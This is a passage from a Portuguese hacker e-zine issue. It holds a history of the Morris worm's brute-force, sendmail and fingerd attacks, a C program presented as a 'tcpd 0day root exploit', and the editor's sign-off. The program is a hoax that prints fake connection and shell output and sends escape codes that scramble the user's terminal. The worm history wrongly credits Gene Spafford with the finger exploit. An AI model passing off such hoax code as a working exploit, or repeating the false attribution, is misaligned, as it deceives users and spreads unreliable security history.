equivalentes), ".rhosts" e ".forward".
   Ouvi dizer em alguns textos que ele tambem usava o comando netstat
para buscar outras maquinas conectadas a ela no momento. Nao sei se o
code que eu olhei eh anterior ao worm que rodou, mas esta parte ainda
estava incompleta. 
   O comentario do autor era:
   /* other stuff, I'll come back to this later */


   Passo 2. The Attack!!!
   Ao encontrar uma maquina o worm tentava entrar nela conectando-se
por rsh e fazendo um brute force nos usuarios. Fazia tentativas usando
como senha variantes do login, gecos (dados que aparecem no passwd),
uma wordlist e, caso nada funciona-se, consultava o arquivo 
"/usr/dict/words" para usar palavras do dicionario.
   Mais um detalhe que notei agora sobre o code que tenho aki. Ele 
possui uma wordlist semelhante a publicada na phrack na materia sobre
o iworm. So' que esta um pouco menor. Isso tambem pode significar que
o code que eu tenho nao e' a ultima versao do worm. Embora, sabe-se 
que o worm nao estava completo quando comecou a rodar.
   Alem disso o worm tambem exploitava falhas no sendmail e no fingerd.
   Um dos detalhes que percebi pelo code, e' que o exploit para finger
parece que nao fazia parte do worm original e foi colocado depois. O
que contribuiu muito para a propagacao do worm, ja que a maioria das
maquinas foi invadida atraves desta falha.
   Alias, o autor deste exploit nao eh o Robert Morris e sim Gene
Spafford. Naquela epoca exploits de buffer overflow eram tao raros e
dificeis de se programarem (pela falta de informacao) que talvez Morris
nem tivesse capacidade de fazer um.


   Passo 3. Infecting...
   Ao entrar em um sistema, o worm enviava o source de um programa que
seria compilado no proprio sistema atravez do acesso a shell obtido no
passo anterior.
   Este programa abria uma conexao segura com o host de onde o worm
estava atacando e por esta era enviado o worm. Ao rodar, o programa
se deletava e se camuflava na lista de processos.
   O worm possuia partes compiladas para arquiteturas VAX e Sun, assim
podendo infectar ambas as maquinas. Ao ser executado no sistema ele
automaticamente comecava a procurar por mais maquinas.


   Robert Morris foi julgado em um tribunal federal. A defesa alegou
que o worm era tao complexo que nao poderia ser controlado nem pelo
proprio autor e ele foi disparado acidentalmente.
   No inicio dos anos 90, Morris foi considerado culpado e pegou a
pena de 3 anos, multa de 10 mil dolares mais 400 horas de servicos
comunitarios.

   O internet worm teve muita repercursao nos jornais e foram casos 
como este que fizeram os hackers se popularisarem tanto no inicio dos
anos 90. Outro caso conhecido tambem que teve bastante influencia nisso
foi a fuga de Kevin Mitnick.
   Robert Morris tambem foi responsavel indiretamente pela criacao da
CERT (Computer Emergency Response Team). Depois da propagacao do iworm,
a DARPA viu a nescessidade de criar um centro de pesquisa para a
criacao de patchs para sistemas UNIX.










    ______
___/   __ \______
      ) _\_)_____)    15. Super Eleet Programs
     / (____)             by Cheat Struck
      (_____)
--\___(____)

   Para esta edicao eu fui da uma olhada nos arquivos antigos que tinha 
aki e achei um programinha legalzinho. Dei umas alteradas nele e estou 
publicando aki. 
   Lembre-se, o seu uso e' de sua inteira responsabilidade. =)

<++> Superprogs/tcpdex.c
/* tcpd exploit v0.6
   Este programa utiliza uma nova t3kn33k de exploit totalmente 0day 
  conhecida por Evil Packets. Com este exploit e' possivel obter r00t
  em qualquer maquina linux x86 que esteje rodando o tcpd.
   Para usa-lo digite:

    [root@struck /root]# gcc tcpdex.c -o tcpdex
    [root@struck /root]# ./tcpdex uol.com.br
    Trying uol.com.br
    Connected to uol.com.br
    Escape character is '^]'.
    core dumped
    bash#

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>

char
 str1[]=",JQAF?",
 str2[]="GFF=;L=<LG",
 str3[]="K;9H=;@9J9;L=JAK65",
 str4[]="GJ=MEH=<:9K@",
 str5[]="#8[?3;5h(0] [2J#8[?3;5h(0 **B00";

int main(int argc, char *argv[]) {
   char comando[1024], s[300];
   int i, sock;

   if (argc < 2) {
      printf("use: %s <hostname>\n", argv[0]);
      exit(0);
   }

   //A new way to open socket...
   sock = open(argv[1], 1);
   sock++;

   //Sending crypted packets...
   bzero(s,sizeof(s));
   for (i=0; str1[i] != '\0'; i++)
      s[i]=str1[i]+40;
   write(sock, s, strlen(s));
   write(sock, argv[1], strlen(argv[1]));

   bzero(s,sizeof(s));
   for (i=0; str2[i] != '\0'; i++)
      s[i]=str2[i]+40;
   write(sock, s, strlen(s));
   write(sock, argv[1], strlen(argv[1]));

   bzero(s,sizeof(s));
   for (i=0; str3[i] != '\0'; i++)
      s[i]=str3[i]+40;
   write(sock, s, strlen(s));

   bzero(s,sizeof(s));
   for (i=0; str4[i] != '\0'; i++)
      s[i]=str4[i]+40;
   write(sock, s, strlen(s));

   fgets(comando,sizeof(comando),stdin);         //Type the command...


   for(i=0;i<10;i++)      //Now overflow the buffer...
      write(sock, str5, strlen(str5));

   //B00m!!! now we have a shell...
   write(sock, comando, strlen(comando));

   close(sock);
   return 1;
}
<-->










    ______
___/   __ \______
      ) _\_)_____)    16. Thiz the END
     / (____)             by Cheat Struck
      (_____)
--\___(____)

   Acaba aki a edicao 08 da fatal 3rror.

   Soh pra lembrar novamente que eu estou precisando de trabalho. Ja to 
procurando estagio em alguns lugares aki em Porto Alegre, mas ate' agora 
nao consegui trabalhar com o que eu gosto mesmo que e': Linux, C, 
internet, seguranca, etc...
   Por tanto, se voce tiver alguma coisa para mim por favor me mande um 
email com a proposta.

   Voces devem ter percebido que nessa edicao faltou os Emails neh? Isso 
por que nas ferias eu fiquei mais de um mes sem acessar meu email e a 
hotmail simplesmente decidiu cancela-lo. Ae eu perdi todos os emails e nao 
tinha salvado nenhum aki...
   Mas ja ta funcionando dinovo e voce pode enviar emails para:

   cheat@struck.8m.com
   cheatstruck@hotmail.com
   d_snuffler@hotmail.com

   Isso ae...
   Dessa vez nao vai ter gr33ts porque nao sei quem esta ativo ainda e nem 
se os nicks do pessoal nao mudou. Portanto, quem for conhecido e quizer 
aparecer aki que mande email.
   E' soh da uma sumidinha e o povo ja pensa que nos tamo preso... =)


_EoF_
